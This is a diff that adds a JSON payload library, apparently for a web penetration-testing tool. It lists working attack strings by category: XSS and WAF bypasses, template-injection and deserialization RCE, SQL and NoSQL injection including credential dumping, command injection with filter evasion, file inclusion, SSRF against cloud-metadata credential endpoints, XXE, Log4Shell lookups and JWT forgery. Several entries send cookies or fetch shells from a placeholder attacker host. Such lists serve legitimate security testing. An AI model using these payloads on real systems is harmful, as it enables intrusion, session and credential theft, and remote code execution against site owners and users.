@@ -1,0 +1,482 @@
+[
+  {
+    "name": "XSS",
+    "payloads": [
+      {"value": "<script>alert(1)</script>", "note": "Classic reflected/stored probe"},
+      {"value": "\"><script>alert(1)</script>", "note": "Break out of a double-quoted attribute"},
+      {"value": "'><script>alert(1)</script>", "note": "Break out of a single-quoted attribute"},
+      {"value": "<img src=x onerror=alert(1)>", "note": "No <script> tag needed"},
+      {"value": "<svg onload=alert(1)>", "note": "SVG onload"},
+      {"value": "<svg/onload=alert(1)>", "note": "No-space SVG (filter bypass)"},
+      {"value": "<body onload=alert(1)>", "note": "Body onload"},
+      {"value": "<iframe src=javascript:alert(1)>", "note": "iframe javascript: URI"},
+      {"value": "<details open ontoggle=alert(1)>", "note": "ontoggle auto-fires"},
+      {"value": "<input autofocus onfocus=alert(1)>", "note": "Autofocus fires onfocus"},
+      {"value": "<video><source onerror=alert(1)>", "note": "Media error handler"},
+      {"value": "<a href=javascript:alert(1)>click</a>", "note": "javascript: in href"},
+      {"value": "javascript:alert(1)", "note": "Raw URL/href sink"},
+      {"value": "<marquee onstart=alert(1)>", "note": "onstart event"},
+      {"value": "<script>fetch('//OOB/?c='+document.cookie)</script>", "note": "Cookie exfiltration to OOB"},
+      {"value": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//", "note": "Polyglot for many contexts"}
+    ]
+  },
+  {
+    "name": "XSS - WAF bypass",
+    "payloads": [
+      {"value": "<sCrIpt>alert(1)</sCrIpt>", "note": "Case variation"},
+      {"value": "<img/src/onerror=alert(1)>", "note": "Slashes instead of spaces"},
+      {"value": "<img src=x onerror=alert`1`>", "note": "Backtick template call (no parens)"},
+      {"value": "<svg onload=alert&#40;1&#41;>", "note": "HTML numeric entity parens"},
+      {"value": "<svg onload=alert&lpar;1&rpar;>", "note": "HTML named entity parens"},
+      {"value": "<img src=x onerror=\"eval(atob('YWxlcnQoMSk='))\">", "note": "Base64-encoded eval"},
+      {"value": "<img src=x onerror=top['al'+'ert'](1)>", "note": "String concatenation"},
+      {"value": "<img src=x onerror=\\u0061lert(1)>", "note": "Unicode-escaped function name"},
+      {"value": "<iframe srcdoc=\"&lt;script&gt;alert(1)&lt;/script&gt;\">", "note": "srcdoc with entity-encoded script"},
+      {"value": "%3Cscript%3Ealert(1)%3C/script%3E", "note": "URL-encoded"},
+      {"value": "%253Cscript%253Ealert(1)%253C/script%253E", "note": "Double URL-encoded"},
+      {"value": "<<script>alert(1);//<</script>", "note": "Double angle bracket"},
+      {"value": "<x onclick=alert(1)>click", "note": "Arbitrary tag + event"},
+      {"value": "<img src=x onerror=confirm(1)>", "note": "Alternate sink function"},
+      {"value": "<svg><script>alert&#40;1&#41;</script></svg>", "note": "SVG-namespaced script"}
+    ]
+  },
+  {
+    "name": "XSS - DOM & AngularJS (CSTI)",
+    "payloads": [
+      {"value": "{{7*7}}", "note": "Client-side template injection detection (49 = vulnerable)"},
+      {"value": "{{constructor.constructor('alert(1)')()}}", "note": "AngularJS sandbox escape (>=1.6)"},
+      {"value": "{{$on.constructor('alert(1)')()}}", "note": "AngularJS 1.6 sandbox escape"},
+      {"value": "{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}", "note": "AngularJS 1.3.x"},
+      {"value": "#\" onmouseover=\"alert(1)", "note": "Hash-based DOM sink breakout"},
+      {"value": "javascript:void(alert(document.domain))", "note": "javascript: sink with domain"},
+      {"value": "\"><img src=x onerror=eval(location.hash.slice(1))>#alert(1)", "note": "location.hash sink"},
+      {"value": "'-alert(1)-'", "note": "Breakout inside a JS string sink"},
+      {"value": "\\'-alert(1)//", "note": "Escaped-quote JS context"},
+      {"value": "</script><script>alert(1)</script>", "note": "Break out of an inline script block"}
+    ]
+  },
+  {
+    "name": "SSTI (template injection)",
+    "payloads": [
+      {"value": "{{7*7}}", "note": "Detect: Jinja2/Twig render 49"},
+      {"value": "{{7*'7'}}", "note": "Fingerprint: 7777777=Jinja2, 49=Twig"},
+      {"value": "${7*7}", "note": "FreeMarker / JSP EL / Thymeleaf"},
+      {"value": "#{7*7}", "note": "Ruby / JSF / Thymeleaf"},
+      {"value": "*{7*7}", "note": "Thymeleaf selection expression"},
+      {"value": "<%= 7*7 %>", "note": "ERB (Ruby) / EJS"},
+      {"value": "@(7*7)", "note": "Razor (.NET)"},
+      {"value": "{{config}}", "note": "Jinja2 (Flask) config dump"},
+      {"value": "{{config.items()}}", "note": "Jinja2 config key/value dump"},
+      {"value": "{{''.__class__.__mro__[1].__subclasses__()}}", "note": "Jinja2 gadget enumeration"},
+      {"value": "{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}", "note": "Jinja2 RCE"},
+      {"value": "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}", "note": "Jinja2/Flask RCE"},
+      {"value": "${T(java.lang.Runtime).getRuntime().exec('id')}", "note": "Spring SpEL RCE"},
+      {"value": "${\"freemarker.template.utility.Execute\"?new()(\"id\")}", "note": "FreeMarker RCE"},
+      {"value": "#set($e=\"\")#set($rt=$e.class.forName('java.lang.Runtime'))$rt.getRuntime().exec('id')", "note": "Velocity RCE"},
+      {"value": "{php}echo `id`;{/php}", "note": "Smarty (older) RCE"},
+      {"value": "{system('id')}", "note": "Smarty function call"},
+      {"value": "{{#with \"s\" as |string|}}{{#with (string.sub.apply 0 (string.split.apply \"\"))}}...{{/with}}{{/with}}", "note": "Handlebars RCE (see PayloadsAllTheThings for full)"},
+      {"value": "${self.module.cache.util.os.system('id')}", "note": "Mako (Python) RCE"},
+      {"value": "#{ system('id') }", "note": "Ruby ERB-style RCE"}
+    ]
+  },
+  {
+    "name": "SQLi - auth bypass",
+    "payloads": [
+      {"value": "' OR '1'='1", "note": "Classic"},
+      {"value": "' OR '1'='1'-- -", "note": "Comment out the rest"},
+      {"value": "' OR 1=1-- -", "note": "Numeric"},
+      {"value": "admin'-- -", "note": "Log in as admin (comment password)"},
+      {"value": "admin'#", "note": "MySQL hash comment"},
+      {"value": "admin'/*", "note": "Inline comment start"},
+      {"value": "' OR ''='", "note": "Empty comparison"},
+      {"value": "\") OR (\"1\"=\"1", "note": "Parenthesised double-quote context"},
+      {"value": "') OR ('1'='1", "note": "Parenthesised single-quote context"},
+      {"value": "' OR 1=1 LIMIT 1-- -", "note": "Force a single row"},
+      {"value": "\" OR 1=1-- -", "note": "Double-quote context"},
+      {"value": "' OR 'x'='x", "note": "Alt comparison"}
+    ]
+  },
+  {
+    "name": "SQLi - UNION / error / DB-specific",
+    "payloads": [
+      {"value": "' ORDER BY 1-- -", "note": "Increment to find column count"},
+      {"value": "' UNION SELECT NULL-- -", "note": "Match one column"},
+      {"value": "' UNION SELECT NULL,NULL-- -", "note": "Match two columns"},
+      {"value": "' UNION SELECT @@version-- -", "note": "MySQL / MSSQL version"},
+      {"value": "' UNION SELECT version()-- -", "note": "MySQL / PostgreSQL version"},
+      {"value": "' UNION SELECT banner FROM v$version-- -", "note": "Oracle version"},
+      {"value": "' UNION SELECT table_name,NULL FROM information_schema.tables-- -", "note": "Enumerate tables"},
+      {"value": "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'-- -", "note": "Enumerate columns"},
+      {"value": "' AND extractvalue(1,concat(0x7e,version()))-- -", "note": "MySQL error-based (extractvalue)"},
+      {"value": "' AND updatexml(1,concat(0x7e,(SELECT version())),1)-- -", "note": "MySQL error-based (updatexml)"},
+      {"value": "' AND 1=CONVERT(int,@@version)-- -", "note": "MSSQL error-based"},
+      {"value": "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))-- -", "note": "Oracle error-based"},
+      {"value": "' UNION SELECT NULL,concat(username,0x3a,password) FROM users-- -", "note": "Dump credentials"}
+    ]
+  },
+  {
+    "name": "SQLi - blind (boolean/time)",
+    "payloads": [
+      {"value": "' AND 1=1-- -", "note": "Boolean TRUE control"},
+      {"value": "' AND 1=2-- -", "note": "Boolean FALSE control"},
+      {"value": "' AND SLEEP(5)-- -", "note": "MySQL time-based"},
+      {"value": "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -", "note": "MySQL subquery time-based"},
+      {"value": "' AND IF(1=1,SLEEP(5),0)-- -", "note": "MySQL conditional time-based"},
+      {"value": "'; WAITFOR DELAY '0:0:5'-- -", "note": "MSSQL time-based"},
+      {"value": "' AND pg_sleep(5)-- -", "note": "PostgreSQL time-based"},
+      {"value": "' AND 1=(SELECT 1 FROM PG_SLEEP(5))-- -", "note": "PostgreSQL time-based (subquery)"},
+      {"value": "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1-- -", "note": "Oracle time-based"},
+      {"value": "' RLIKE SLEEP(5)-- -", "note": "MySQL RLIKE time-based"},
+      {"value": "' OR BENCHMARK(5000000,MD5(1))-- -", "note": "MySQL CPU-heavy delay"}
+    ]
+  },
+  {
+    "name": "SQLi - WAF bypass",
+    "payloads": [
+      {"value": "'/**/OR/**/1=1-- -", "note": "Inline comments as whitespace"},
+      {"value": "'/*!50000OR*/1=1-- -", "note": "MySQL versioned comment"},
+      {"value": "/*!50000UNION*//*!50000SELECT*/", "note": "Versioned UNION SELECT"},
+      {"value": "UNI/**/ON SEL/**/ECT", "note": "Split keywords with comments"},
+      {"value": "' oR 1=1-- -", "note": "Mixed case keyword"},
+      {"value": "' OR 1 like 1-- -", "note": "LIKE instead of ="},
+      {"value": "'+OR+1=1--+", "note": "Plus as space"},
+      {"value": "%27%20OR%201=1--%20-", "note": "URL-encoded"},
+      {"value": "' OR 1=1%23", "note": "URL-encoded # comment"},
+      {"value": "' OR 'a'||'b'='ab", "note": "String concatenation (Oracle/PostgreSQL)"},
+      {"value": "' OR 2>1-- -", "note": "Alternate always-true"},
+      {"value": "'%0aOR%0a1=1-- -", "note": "Newline as whitespace"},
+      {"value": "'||(SELECT 1)||'", "note": "Concatenated subquery"}
+    ]
+  },
+  {
+    "name": "NoSQL injection",
+    "payloads": [
+      {"value": "{\"$ne\": null}", "note": "MongoDB: not-equal matches anything"},
+      {"value": "{\"$ne\": \"\"}", "note": "Not-equal empty"},
+      {"value": "{\"$gt\": \"\"}", "note": "Greater-than empty"},
+      {"value": "{\"$regex\": \".*\"}", "note": "Regex match-all"},
+      {"value": "{\"$where\": \"1==1\"}", "note": "$where JS evaluation"},
+      {"value": "{\"$where\": \"sleep(5000)\"}", "note": "$where time-based blind"},
+      {"value": "{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}", "note": "Auth bypass (JSON body)"},
+      {"value": "username[$ne]=1&password[$ne]=1", "note": "Operator injection via query string"},
+      {"value": "admin' || '1'=='1", "note": "JS string injection"},
+      {"value": "';return true;var x='", "note": "$where JS breakout"},
+      {"value": "{\"$nin\": [\"\"]}", "note": "Not-in empty set"}
+    ]
+  },
+  {
+    "name": "Command injection",
+    "payloads": [
+      {"value": "; id", "note": "Command separator (Unix)"},
+      {"value": "| id", "note": "Pipe"},
+      {"value": "& id", "note": "Background / AND (Windows & Unix)"},
+      {"value": "&& id", "note": "Run if previous succeeds"},
+      {"value": "|| id", "note": "Run if previous fails"},
+      {"value": "`id`", "note": "Backtick substitution"},
+      {"value": "$(id)", "note": "Command substitution"},
+      {"value": "; sleep 5", "note": "Time-based confirm (Unix)"},
+      {"value": "& ping -n 4 127.0.0.1", "note": "Time-based confirm (Windows)"},
+      {"value": "; ping -c 4 127.0.0.1", "note": "Time-based confirm (Unix)"},
+      {"value": "%0aid", "note": "Newline injection"},
+      {"value": "; cat /etc/passwd", "note": "Read a file"},
+      {"value": "; nslookup OOB", "note": "Blind OOB DNS"},
+      {"value": "$(curl OOB)", "note": "Blind OOB HTTP"},
+      {"value": "| whoami", "note": "Windows/Unix identity"}
+    ]
+  },
+  {
+    "name": "Command injection - WAF/filter bypass",
+    "payloads": [
+      {"value": ";cat$IFS/etc/passwd", "note": "$IFS instead of space"},
+      {"value": ";cat${IFS}/etc/passwd", "note": "${IFS} braces"},
+      {"value": ";cat$IFS$9/etc/passwd", "note": "$IFS$9 trick"},
+      {"value": ";{cat,/etc/passwd}", "note": "Brace expansion (no space)"},
+      {"value": ";cat</etc/passwd", "note": "Input redirection"},
+      {"value": ";i''d", "note": "Empty quotes inside command"},
+      {"value": ";i\"\"d", "note": "Empty double-quotes"},
+      {"value": ";c\\at /etc/passwd", "note": "Backslash keyword break"},
+      {"value": ";/???/??t /???/p??sw?", "note": "Glob wildcards (cat /etc/passwd)"},
+      {"value": ";echo aWQ=|base64 -d|sh", "note": "Base64-encoded command"},
+      {"value": ";$'\\x69\\x64'", "note": "Hex-escaped command (id)"},
+      {"value": ";$'\\143\\141\\164'/etc/passwd", "note": "Octal-escaped command (cat)"},
+      {"value": "%0acat%09/etc/passwd", "note": "Newline + tab as separators"},
+      {"value": ";rev<<<'dwssap/cte/ tac'|sh", "note": "Reversed command"}
+    ]
+  },
+  {
+    "name": "LFI / Path traversal",
+    "payloads": [
+      {"value": "../../../../etc/passwd", "note": "Classic Unix traversal"},
+      {"value": "../../../../../../../../etc/passwd", "note": "Deep traversal"},
+      {"value": "..%2f..%2f..%2fetc%2fpasswd", "note": "URL-encoded slashes"},
+      {"value": "..%252f..%252f..%252fetc%252fpasswd", "note": "Double URL-encoded"},
+      {"value": "....//....//....//etc/passwd", "note": "Bypass naive ../ stripping"},
+      {"value": "..%c0%af..%c0%af..%c0%afetc/passwd", "note": "Overlong UTF-8 slash"},
+      {"value": "/etc/passwd", "note": "Absolute path"},
+      {"value": "/etc/passwd%00", "note": "Null byte truncation (old PHP)"},
+      {"value": "/etc/passwd%00.png", "note": "Null byte + expected extension"},
+      {"value": "..\\..\\..\\windows\\win.ini", "note": "Windows traversal"},
+      {"value": "..%5c..%5c..%5cwindows%5cwin.ini", "note": "URL-encoded backslashes"},
+      {"value": "C:\\Windows\\System32\\drivers\\etc\\hosts", "note": "Windows absolute path"},
+      {"value": "/proc/self/environ", "note": "Env (UA/Referer injection RCE)"},
+      {"value": "/var/log/apache2/access.log", "note": "Log poisoning target"}
+    ]
+  },
+  {
+    "name": "LFI - PHP wrappers & RCE",
+    "payloads": [
+      {"value": "php://filter/convert.base64-encode/resource=index.php", "note": "Read PHP source as base64"},
+      {"value": "php://filter/read=convert.base64-encode/resource=config.php", "note": "Read config source"},
+      {"value": "php://filter/convert.iconv.utf-8.utf-16/resource=index.php", "note": "iconv filter variant"},
+      {"value": "data://text/plain,<?php system($_GET['c']);?>", "note": "data:// wrapper RCE"},
+      {"value": "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+", "note": "data:// base64 RCE"},
+      {"value": "php://input", "note": "RCE: send <?php system('id');?> in POST body"},
+      {"value": "expect://id", "note": "expect:// wrapper RCE (if enabled)"},
+      {"value": "zip://shell.jpg%23payload.php", "note": "zip:// wrapper"},
+      {"value": "phar://shell.jpg/payload.php", "note": "phar:// wrapper (deserialization)"}
+    ]
+  },
+  {
+    "name": "RFI (remote file inclusion)",
+    "payloads": [
+      {"value": "http://OOB/shell.txt", "note": "Remote PHP include"},
+      {"value": "http://OOB/shell.txt?", "note": "Trailing ? to cut appended extension"},
+      {"value": "http://OOB/shell.txt%00", "note": "Null byte to cut appended extension"},
+      {"value": "\\\\OOB\\share\\shell.php", "note": "UNC path (Windows SMB)"},
+      {"value": "data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+", "note": "data:// as RFI"}
+    ]
+  },
+  {
+    "name": "SSRF",
+    "payloads": [
+      {"value": "http://127.0.0.1/", "note": "Loopback"},
+      {"value": "http://localhost/", "note": "Hostname loopback"},
+      {"value": "http://0.0.0.0/", "note": "All-interfaces"},
+      {"value": "http://[::1]/", "note": "IPv6 loopback"},
+      {"value": "http://0/", "note": "0 resolves to 127.0.0.1"},
+      {"value": "http://127.1/", "note": "Short-form loopback"},
+      {"value": "http://2130706433/", "note": "Decimal IP for 127.0.0.1"},
+      {"value": "http://0x7f000001/", "note": "Hex IP for 127.0.0.1"},
+      {"value": "http://0177.0.0.1/", "note": "Octal IP for 127.0.0.1"},
+      {"value": "http://127.0.0.1@evil.com/", "note": "Userinfo confusion"},
+      {"value": "http://evil.com#@127.0.0.1/", "note": "Fragment confusion"},
+      {"value": "file:///etc/passwd", "note": "Local file read via SSRF"},
+      {"value": "dict://127.0.0.1:6379/info", "note": "dict:// to internal Redis"},
+      {"value": "gopher://127.0.0.1:6379/_%2A1%0D%0A", "note": "gopher:// to craft internal requests"},
+      {"value": "http://spoofed.OOB/", "note": "Confirm SSRF via out-of-band"}
+    ]
+  },
+  {
+    "name": "SSRF - cloud metadata",
+    "payloads": [
+      {"value": "http://169.254.169.254/latest/meta-data/", "note": "AWS metadata root"},
+      {"value": "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "note": "AWS IAM role names"},
+      {"value": "http://169.254.169.254/latest/user-data/", "note": "AWS user-data (often secrets)"},
+      {"value": "http://169.254.169.254/latest/api/token", "note": "AWS IMDSv2 token (PUT, header X-aws-ec2-metadata-token-ttl-seconds)"},
+      {"value": "http://metadata.google.internal/computeMetadata/v1/", "note": "GCP metadata (needs header Metadata-Flavor: Google)"},
+      {"value": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", "note": "GCP service-account token"},
+      {"value": "http://169.254.169.254/metadata/instance?api-version=2021-02-01", "note": "Azure metadata (needs header Metadata: true)"},
+      {"value": "http://169.254.169.254/metadata/v1/", "note": "DigitalOcean metadata"},
+      {"value": "http://100.100.100.200/latest/meta-data/", "note": "Alibaba Cloud metadata"}
+    ]
+  },
+  {
+    "name": "XXE",
+    "payloads": [
+      {"value": "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>", "note": "Classic file read"},
+      {"value": "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"http://OOB/\">]><r>&x;</r>", "note": "Out-of-band / blind"},
+      {"value": "<!DOCTYPE r [<!ENTITY % p SYSTEM \"http://OOB/e.dtd\">%p;]>", "note": "External parameter entity (blind exfil)"},
+      {"value": "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">]><r>&x;</r>", "note": "PHP filter to read non-XML files"},
+      {"value": "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"expect://id\">]><r>&x;</r>", "note": "RCE via expect:// (if enabled)"},
+      {"value": "<svg xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"file:///etc/passwd\"/></svg>", "note": "XInclude inside SVG upload"},
+      {"value": "<!DOCTYPE r [<!ENTITY a \"aaaa\"><!ENTITY b \"&a;&a;&a;&a;&a;\">]><r>&b;</r>", "note": "Billion-laughs style DoS (keep small in tests)"}
+    ]
+  },
+  {
+    "name": "Open redirect",
+    "payloads": [
+      {"value": "//evil.com", "note": "Protocol-relative"},
+      {"value": "///evil.com", "note": "Triple slash"},
+      {"value": "https://evil.com", "note": "Absolute"},
+      {"value": "https:evil.com", "note": "Missing slashes"},
+      {"value": "/\\evil.com", "note": "Backslash trick"},
+      {"value": "\\/\\/evil.com", "note": "Mixed slash/backslash"},
+      {"value": "https://legit.com@evil.com", "note": "Userinfo confusion"},
+      {"value": "https://evil.com?legit.com", "note": "Query-string decoy"},
+      {"value": "https://evil.com#legit.com", "note": "Fragment decoy"},
+      {"value": "http://evil.com\\.legit.com", "note": "Backslash host confusion"},
+      {"value": "//evil%E3%80%82com", "note": "Ideographic full stop as dot"},
+      {"value": "/%09/evil.com", "note": "Tab prefix"},
+      {"value": "/%2f%2fevil.com", "note": "Encoded double slash"}
+    ]
+  },
+  {
+    "name": "CRLF / response splitting",
+    "payloads": [
+      {"value": "%0d%0aSet-Cookie:%20injected=1", "note": "Inject a Set-Cookie header"},
+      {"value": "%0d%0aLocation:%20https://evil.com", "note": "Force a redirect"},
+      {"value": "%0d%0aContent-Length:%200%0d%0a%0d%0a", "note": "Truncate the response"},
+      {"value": "%0d%0a%0d%0a<script>alert(1)</script>", "note": "Response splitting to XSS"},
+      {"value": "%E5%98%8D%E5%98%8ASet-Cookie:%20injected=1", "note": "Unicode CRLF bypass (Chrome/UTF-8)"},
+      {"value": "%0aSet-Cookie:%20injected=1", "note": "LF-only variant"},
+      {"value": "\r\nSet-Cookie: injected=1", "note": "Raw CRLF (non-encoded sinks)"}
+    ]
+  },
+  {
+    "name": "Host header injection",
+    "payloads": [
+      {"value": "Host: evil.com", "note": "Password-reset poisoning / cache poisoning"},
+      {"value": "Host: target.com:80@evil.com", "note": "Port + userinfo confusion"},
+      {"value": "X-Forwarded-Host: evil.com", "note": "Often reflected into links/cache"},
+      {"value": "X-Forwarded-For: 127.0.0.1", "note": "Spoof source IP / ACL bypass"},
+      {"value": "X-Host: evil.com", "note": "Alternate host override"},
+      {"value": "X-Forwarded-Server: evil.com", "note": "Alternate host override"},
+      {"value": "X-Original-URL: /admin", "note": "Front-end ACL bypass"},
+      {"value": "X-Rewrite-URL: /admin", "note": "Front-end ACL bypass"},
+      {"value": "Host: localhost", "note": "Reach internal-only vhost"}
+    ]
+  },
+  {
+    "name": "CORS test origins",
+    "payloads": [
+      {"value": "Origin: https://evil.com", "note": "Check if arbitrary origin is reflected + credentials true"},
+      {"value": "Origin: null", "note": "null origin often whitelisted (sandboxed iframe)"},
+      {"value": "Origin: https://target.com.evil.com", "note": "Suffix-match misconfig"},
+      {"value": "Origin: https://evil-target.com", "note": "Prefix/substring-match misconfig"},
+      {"value": "Origin: https://sub.target.com", "note": "Trusted-subdomain takeover chain"}
+    ]
+  },
+  {
+    "name": "File upload bypass",
+    "payloads": [
+      {"value": "shell.php.jpg", "note": "Double extension (right-to-left parsers)"},
+      {"value": "shell.jpg.php", "note": "Double extension (left-to-right parsers)"},
+      {"value": "shell.pHp", "note": "Case variation"},
+      {"value": "shell.php5", "note": "Alternate PHP extension"},
+      {"value": "shell.phtml", "note": "Alternate PHP extension"},
+      {"value": "shell.phar", "note": "Alternate PHP extension"},
+      {"value": "shell.asp;.jpg", "note": "IIS semicolon trick"},
+      {"value": "shell.php%00.jpg", "note": "Null byte extension truncation"},
+      {"value": "shell.php.", "note": "Trailing dot (Windows strips it)"},
+      {"value": "GIF89a;<?php system($_GET['c']);?>", "note": "Fake magic bytes + PHP"},
+      {"value": ".htaccess", "note": "Upload to map new extensions to PHP handler"},
+      {"value": "../../shell.php", "note": "Path traversal in the filename"},
+      {"value": "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(1)\"/>", "note": "Stored XSS via SVG upload"}
+    ]
+  },
+  {
+    "name": "JWT attacks",
+    "payloads": [
+      {"value": "{\"alg\":\"none\",\"typ\":\"JWT\"}", "note": "alg:none header (strip signature) — RoleBreaker automates this"},
+      {"value": "eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.", "note": "alg:none token with empty signature (role=admin)"},
+      {"value": "{\"alg\":\"HS256\",\"typ\":\"JWT\",\"kid\":\"../../../../../../dev/null\"}", "note": "kid path traversal → sign with empty key"},
+      {"value": "{\"alg\":\"HS256\",\"kid\":\"key' UNION SELECT 'secret'-- -\"}", "note": "kid SQL injection to control the signing key"},
+      {"value": "{\"alg\":\"HS256\",\"jku\":\"https://OOB/jwks.json\"}", "note": "jku pointing to attacker-controlled JWKS"},
+      {"value": "{\"alg\":\"HS256\",\"x5u\":\"https://OOB/cert.pem\"}", "note": "x5u pointing to attacker cert"},
+      {"value": "RS256->HS256 confusion", "note": "Re-sign with the RSA public key as an HMAC secret"},
+      {"value": "keyboardcat", "note": "Try common weak HMAC secrets — RoleBreaker cracks these"}
+    ]
+  },
+  {
+    "name": "LDAP injection",
+    "payloads": [
+      {"value": "*", "note": "Wildcard — match all"},
+      {"value": "*)(uid=*))(|(uid=*", "note": "Auth bypass classic"},
+      {"value": "*)(|(password=*))", "note": "Return all with a password attribute"},
+      {"value": "admin*", "note": "Prefix match"},
+      {"value": "*)(objectClass=*", "note": "Enumerate objects"},
+      {"value": ")(cn=*", "note": "Filter breakout"},
+      {"value": "*)(&", "note": "AND breakout"},
+      {"value": "*))%00", "note": "Null byte truncation"}
+    ]
+  },
+  {
+    "name": "XPath injection",
+    "payloads": [
+      {"value": "' or '1'='1", "note": "Classic"},
+      {"value": "' or 1=1 or ''='", "note": "Always true"},
+      {"value": "x' or name()='username' or 'x'='y", "note": "Node-name probe"},
+      {"value": "']|//user/*|//['", "note": "Return all user nodes"},
+      {"value": "count(/*)", "note": "Count root children"},
+      {"value": "' or position()=1 or '", "note": "Positional bypass"}
+    ]
+  },
+  {
+    "name": "SSI / ESI injection",
+    "payloads": [
+      {"value": "<!--#exec cmd=\"id\"-->", "note": "Server-Side Includes command execution"},
+      {"value": "<!--#include virtual=\"/etc/passwd\"-->", "note": "SSI file include"},
+      {"value": "<!--#echo var=\"DATE_LOCAL\"-->", "note": "SSI detection (echoes date)"},
+      {"value": "<esi:include src=\"http://OOB/\"/>", "note": "Edge-Side Includes SSRF"},
+      {"value": "<esi:include src=\"http://OOB/\" stylesheet=\"...\"/>", "note": "ESI variant"}
+    ]
+  },
+  {
+    "name": "GraphQL",
+    "payloads": [
+      {"value": "{__typename}", "note": "Confirm a GraphQL endpoint"},
+      {"value": "{__schema{types{name}}}", "note": "Introspection: list types"},
+      {"value": "{__schema{queryType{fields{name}}}}", "note": "Introspection: list root queries"},
+      {"value": "query{__schema{mutationType{fields{name args{name type{name}}}}}}", "note": "Introspection: mutations + args"},
+      {"value": "{__type(name:\"User\"){fields{name type{name}}}}", "note": "Introspect a specific type"},
+      {"value": "[{\"query\":\"{__typename}\"},{\"query\":\"{__typename}\"}]", "note": "Query batching (rate-limit bypass)"},
+      {"value": "query{user(id:1){id name email password}}", "note": "Over-fetch sensitive fields"}
+    ]
+  },
+  {
+    "name": "Log4Shell / JNDI",
+    "payloads": [
+      {"value": "${jndi:ldap://OOB/a}", "note": "Log4j JNDI LDAP lookup"},
+      {"value": "${jndi:rmi://OOB/a}", "note": "JNDI RMI lookup"},
+      {"value": "${jndi:dns://OOB/a}", "note": "DNS-only (detection, no RCE)"},
+      {"value": "${${lower:j}ndi:ldap://OOB/a}", "note": "Nested lookup WAF bypass"},
+      {"value": "${${::-j}${::-n}${::-d}${::-i}:ldap://OOB/a}", "note": "Default-value bypass"},
+      {"value": "${jndi:${lower:l}${lower:d}ap://OOB/a}", "note": "Scheme obfuscation"},
+      {"value": "${env:USER}", "note": "Environment variable leak"},
+      {"value": "${sys:user.name}", "note": "System property leak"},
+      {"value": "%24%7Bjndi%3Aldap%3A%2F%2FOOB%2Fa%7D", "note": "URL-encoded JNDI"}
+    ]
+  },
+  {
+    "name": "Prototype pollution",
+    "payloads": [
+      {"value": "{\"__proto__\":{\"polluted\":\"yes\"}}", "note": "JSON body pollution"},
+      {"value": "{\"constructor\":{\"prototype\":{\"polluted\":\"yes\"}}}", "note": "Via constructor.prototype"},
+      {"value": "__proto__[polluted]=yes", "note": "Query-string / form pollution"},
+      {"value": "constructor[prototype][polluted]=yes", "note": "Bracket-notation pollution"},
+      {"value": "?__proto__.polluted=yes", "note": "Dot-notation query string"},
+      {"value": "{\"__proto__\":{\"isAdmin\":true}}", "note": "Common privilege gadget"}
+    ]
+  },
+  {
+    "name": "Deserialization markers",
+    "payloads": [
+      {"value": "rO0AB", "note": "Base64 start of a Java serialized object (0xACED0005)"},
+      {"value": "aced0005", "note": "Hex magic bytes of Java serialization"},
+      {"value": "O:8:\"stdClass\":0:{}", "note": "PHP serialized object"},
+      {"value": "a:1:{i:0;s:2:\"hi\";}", "note": "PHP serialized array"},
+      {"value": "AAEAAAD/////", "note": "Base64 start of .NET BinaryFormatter"},
+      {"value": "_$$ND_FUNC$$_function(){return require('child_process').exec('id')}()", "note": "Node.js node-serialize RCE gadget"},
+      {"value": "\\x04\\x08", "note": "Ruby Marshal magic bytes"},
+      {"value": "gAR9", "note": "Base64 start of a Python pickle (protocol 4)"}
+    ]
+  },
+  {
+    "name": "WAF bypass - general techniques",
+    "payloads": [
+      {"value": "?id=1&id=2", "note": "HTTP parameter pollution (last/first wins differs per stack)"},
+      {"value": "%00", "note": "Null byte to truncate WAF parsing"},
+      {"value": "%09", "note": "Tab as whitespace"},
+      {"value": "%0a", "note": "Line feed as whitespace"},
+      {"value": "%0d", "note": "Carriage return as whitespace"},
+      {"value": "%0c", "note": "Form feed as whitespace"},
+      {"value": "%a0", "note": "Non-breaking space (some parsers)"},
+      {"value": "%u0027", "note": "IIS unicode encoding for single quote"},
+      {"value": "/**/", "note": "SQL/JS comment as whitespace"},
+      {"value": "Content-Type: application/json", "note": "Switch body format to dodge form-based WAF rules"},
+      {"value": "Transfer-Encoding: chunked", "note": "Chunked body to split a signature (also smuggling)"},
+      {"value": "X-Original-URL: /restricted", "note": "Path-based ACL bypass at the proxy"}
+    ]
+  }
+]
